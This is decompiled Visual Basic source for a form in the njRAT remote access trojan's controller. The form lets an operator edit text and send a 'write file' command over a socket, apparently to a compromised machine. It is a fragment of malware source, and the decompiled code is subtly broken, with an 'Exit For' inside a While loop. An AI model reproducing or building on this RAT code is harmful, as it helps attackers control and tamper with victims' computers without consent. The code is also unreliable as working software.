Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic.CompilerServices

Namespace NJRAT
	' Token: 0x02000018 RID: 24
	<DesignerGenerated()>
	Public Partial Class Note
		Inherits Form

		' Token: 0x06000353 RID: 851 RVA: 0x0000303B File Offset: 0x0000123B
		<DebuggerNonUserCode()>
		Public Sub New()
			Note.__ENCAddToList(Me)
			Me.InitializeComponent()
		End Sub

		' Token: 0x06000354 RID: 852 RVA: 0x0001D278 File Offset: 0x0001B478
		<DebuggerNonUserCode()>
		Private Shared Sub __ENCAddToList(value As Object)
			Dim _ENCList As List(Of WeakReference) = Note.__ENCList
			SyncLock _ENCList
				If Note.__ENCList.Count = Note.__ENCList.Capacity Then
					Dim num As Integer = 0
					Dim num2 As Integer = 0
					Dim num3 As Integer = Note.__ENCList.Count - 1
					Dim num4 As Integer = num2
					While True
						Dim num5 As Integer = num4
						Dim num6 As Integer = num3
						If num5 > num6 Then
							Exit For
						End If
						Dim weakReference As WeakReference = Note.__ENCList(num4)
						If weakReference.IsAlive Then
							If num4 <> num Then
								Note.__ENCList(num) = Note.__ENCList(num4)
							End If
							num += 1
						End If
						num4 += 1
					End While
					Note.__ENCList.RemoveRange(num, Note.__ENCList.Count - num)
					Note.__ENCList.Capacity = Note.__ENCList.Count
				End If
				Note.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
			End SyncLock
		End Sub

		' Token: 0x17000133 RID: 307
		' (get) Token: 0x06000357 RID: 855 RVA: 0x0001D660 File Offset: 0x0001B860
		' (set) Token: 0x06000358 RID: 856 RVA: 0x0000304F File Offset: 0x0000124F
		Friend Overridable Property MenuStrip1 As MenuStrip
			<DebuggerNonUserCode()>
			Get
				Return Me._MenuStrip1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As MenuStrip)
				Me._MenuStrip1 = value
			End Set
		End Property

		' Token: 0x17000134 RID: 308
		' (get) Token: 0x06000359 RID: 857 RVA: 0x0001D678 File Offset: 0x0001B878
		' (set) Token: 0x0600035A RID: 858 RVA: 0x0001D690 File Offset: 0x0001B890
		Friend Overridable Property ToolStripMenuItem1 As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._ToolStripMenuItem1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ToolStripMenuItem1_Click
				If Me._ToolStripMenuItem1 IsNot Nothing Then
					RemoveHandler Me._ToolStripMenuItem1.Click, value2
				End If
				Me._ToolStripMenuItem1 = value
				If Me._ToolStripMenuItem1 IsNot Nothing Then
					AddHandler Me._ToolStripMenuItem1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000135 RID: 309
		' (get) Token: 0x0600035B RID: 859 RVA: 0x0001D6E8 File Offset: 0x0001B8E8
		' (set) Token: 0x0600035C RID: 860 RVA: 0x0001D700 File Offset: 0x0001B900
		Friend Overridable Property TextBox1 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._TextBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Dim value2 As EventHandler = AddressOf Me.TextBox1_TextChanged
				If Me._TextBox1 IsNot Nothing Then
					RemoveHandler Me._TextBox1.TextChanged, value2
				End If
				Me._TextBox1 = value
				If Me._TextBox1 IsNot Nothing Then
					AddHandler Me._TextBox1.TextChanged, value2
				End If
			End Set
		End Property

		' Token: 0x0600035D RID: 861 RVA: 0x0001D758 File Offset: 0x0001B958
		Private Sub ToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			Dim array As String() = New String(8) {}
			array(0) = "Ex"
			array(1) = Class7.string_1
			array(2) = "fm"
			array(3) = Class7.string_1
			array(4) = "wr"
			array(5) = Class7.string_1
			array(6) = Class6.smethod_14(Me.FN)
			array(7) = Class7.string_1
			Dim textBox As TextBox = Me.TextBox1
			Dim text As String = textBox.Text
			textBox.Text = text
			array(8) = Class6.smethod_14(text)
			Me.SK.Send(String.Concat(array))
			Me.ToolStripMenuItem1.Enabled = False
		End Sub

		' Token: 0x0600035E RID: 862 RVA: 0x00003058 File Offset: 0x00001258
		Private Sub TextBox1_TextChanged(sender As Object, e As EventArgs)
			Me.ToolStripMenuItem1.Enabled = True
		End Sub

		' Token: 0x04000190 RID: 400
		Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

		' Token: 0x04000192 RID: 402
		<AccessedThroughProperty("MenuStrip1")>
		Private _MenuStrip1 As MenuStrip

		' Token: 0x04000193 RID: 403
		<AccessedThroughProperty("ToolStripMenuItem1")>
		Private _ToolStripMenuItem1 As ToolStripMenuItem

		' Token: 0x04000194 RID: 404
		<AccessedThroughProperty("TextBox1")>
		Private _TextBox1 As TextBox

		' Token: 0x04000195 RID: 405
		Public FN As String

		' Token: 0x04000196 RID: 406
		Public SK As Client
	End Class
End Namespace
